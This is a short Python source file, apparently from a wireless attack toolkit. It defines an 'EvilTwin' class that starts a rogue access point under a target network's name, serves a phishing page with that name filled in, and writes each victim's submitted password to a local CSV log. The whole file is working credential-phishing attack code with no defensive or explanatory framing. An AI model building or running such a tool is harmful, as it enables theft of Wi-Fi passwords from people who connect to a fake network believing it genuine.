# -*- coding: utf-8 -*-


class EvilTwin:

  def __init__(self, tools):
    self.tools = tools
    self.web_page = self.get_page()

  def get_page(self):
    with open('data/evil_twin/page.html') as f:
      return f.read()

  def log_credentials(self, request):
    entry = '%s,%s\n' % (self.essid, request['pass'])
    with open('data/evil_twin/log.csv', 'a') as f:
      f.write(entry)

  def start(self, essid):
    self.essid = essid
    self.tools.start_ap(essid)
    self.tools.start_server(
      'TWIN',
      self.web_page.replace('essid', essid),
      self.log_credentials
    )
